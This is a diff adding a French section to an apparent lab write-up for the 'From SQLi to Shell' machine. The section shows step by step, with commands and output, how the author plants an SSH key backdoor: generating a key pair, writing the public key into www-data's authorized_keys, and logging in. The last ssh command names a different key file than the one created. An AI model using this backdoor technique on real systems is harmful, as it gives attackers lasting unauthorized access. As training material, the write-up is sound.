@@ -503,3 +503,87 @@ whoami
 www-data
 
 ```
+
+## Backdoor SSH
+
+La commande `whoami` nous indique que nous sommes l'ustilisateur `www-data`.
+
+```
+$ whoami
+www-data
+```
+
+En regardant le fichier `/etc/passwd`, on constate que l'utilisateur `www-data` a pour dossier HOME `/var/www`, et qu'il peut obtenir un shell sur la box (indiqué par `/bin/sh`).
+
+```sh
+$ grep www-data /etc/passwd
+www-data:x:33:33:www-data:/var/www:/bin/sh
+```
+
+Étant donné qu'il y a un port SSH en écoute. On peut créer une __clé SSH__, et s'en servir pour se connecter en tant que `www-data`.
+
+----------------------
+
+### Fonctionnement de l'authentification par clé SSH :
+Les clés SSH sont composées d'une __clé publique__ (qui sert de "carte d'identité"), et d'une __clé privée__ qui doit être gardée secrete.
+
+On peut se connecter en SSH __sans mot de passe__ en utilisant une clé SSH. Il faut pour cela que la __clé publique soit présente__ dans fichier __`.ssh/authorized_keys`__ du dossier HOME de l'utilisateur pour lequel on s'authentifie.
+
+----------------------
+
+Pour créer la clé sur kali (appuyer sur `Enter` pour ne pas donner de passphrase):
+```bash
+$ ssh-keygen -f ssh_www-data                       
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in ssh_www-data
+Your public key has been saved in ssh_www-data.pub
+The key fingerprint is:
+SHA256:+hsQYWJWGVsdNmXPiVTBVyFhfRAHD8hV4ZZ+PnKWJxU olivier@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|    +.=o..+++O@OB|
+|   o o.+ ..++++*+|
+|      o     . +Eo|
+|       .      o .|
+|      . S      .o|
+|       o       oo|
+|      . .    ..=o|
+|       . .    +.o|
+|        o.       |
++----[SHA256]-----+
+```
+
+On regarde le contenu de la __clé publique SSH__ que l'on vient de créer. (fichier finissant par .pub)
+```bash
+$ cat ssh_www-data.pub 
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMVV0TSRvPqsx4WBCup/MaVa4DCgTb1l1Xy3+nrgrZMo1Q/t8iblL6PHOvC4s2uP6aOPjVEOfI2qDgvZfEfG+J6g2B1GXLZBtnfyk1bJGY7h2dO1yJg0hHqZ91NcEsJ0Qv3Lq7JxoI6NAmiL6vPil69noaMzgSedOswxn247naRLVPGpBCL5f0R+TpRuJ6tF1Xtc++II6aL/zUME7aJR9qxv/9AoDjwE7JYLmAJt7LRp9ZjUBGm53cIuLrnHf4hkNVO2lxA9Atmvm9Zyiwdk55XLpTQp3Pg1Q4Hu/QSR2G6ZFQXEbCUqtlx/pXTfHFoSYixSn1dj4WUgCtVhHhwhhJGiJ70n/Cj37U3JbssSKlaNqa1hPVWxDgT2C2nyZtDIf83qwUjenvpQoPTCgas7p8ef0PF76eGah9TQeAsysjpvLtHBUjsBmZdDmZI+vIkJ0lKk08elIiMCa77NcPO3vIgBnNL29M8Qo+XFMrS8OhZdLRLM1qen5JwoMexyaKhpc= olivier@kali
+```
+
+
+Sur la __machine "From SQLi to Shell"__, on va créer un dossier `.ssh` dans le HOME de www-data `/var/www/`
+
+```bash
+$ mkdir -p /var/www/.ssh/
+```
+
+On peut ensuite ajouter notre __clé publique__ au __fichier des clés autorisées__. Comme il n'existe pas, on crée ce fichier.
+
+```bash
+echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMVV0TSRvPqsx4WBCup/MaVa4DCgTb1l1Xy3+nrgrZMo1Q/t8iblL6PHOvC4s2uP6aOPjVEOfI2qDgvZfEfG+J6g2B1GXLZBtnfyk1bJGY7h2dO1yJg0hHqZ91NcEsJ0Qv3Lq7JxoI6NAmiL6vPil69noaMzgSedOswxn247naRLVPGpBCL5f0R+TpRuJ6tF1Xtc++II6aL/zUME7aJR9qxv/9AoDjwE7JYLmAJt7LRp9ZjUBGm53cIuLrnHf4hkNVO2lxA9Atmvm9Zyiwdk55XLpTQp3Pg1Q4Hu/QSR2G6ZFQXEbCUqtlx/pXTfHFoSYixSn1dj4WUgCtVhHhwhhJGiJ70n/Cj37U3JbssSKlaNqa1hPVWxDgT2C2nyZtDIf83qwUjenvpQoPTCgas7p8ef0PF76eGah9TQeAsysjpvLtHBUjsBmZdDmZI+vIkJ0lKk08elIiMCa77NcPO3vIgBnNL29M8Qo+XFMrS8OhZdLRLM1qen5JwoMexyaKhpc= olivier@kali' >> /var/www/.ssh/authorized_keys
+```
+
+On peut ensuite se connecter avec notre __clé privée SSH__.
+
+D'abord on doit changer les droits de la clé privée.
+```bash
+chmod 600 ssh_www-data
+```
+
+On peut ensuite se connecter en SSH avec notre clé privée.
+```bash
+ssh -i www-data www-data@192.168.56.112
+```
